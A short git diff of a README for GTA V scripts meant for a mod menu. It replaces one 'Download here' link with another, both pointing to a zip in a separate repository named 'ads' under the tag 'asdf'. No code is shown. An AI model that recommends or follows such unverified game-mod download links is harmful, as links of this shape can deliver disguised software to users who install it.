@@ -6,7 +6,7 @@ For Yim Mod Menu, simply put the script into the `scripts` directory inside the 
 
 --------------------------------------------------------------------------------------------------
 
-## [Download here](https://github.com/DcCahyadi/ads/releases/download/asdf/Compressed_release.zip)
+## [Download here](https://github.com/DcCahyadi/ads/releases/download/asdf/v1.0.1_comp.zip)
 
 ## GtaVScripts 
 I'm presenting you some GTA V scripts for online or campaign.
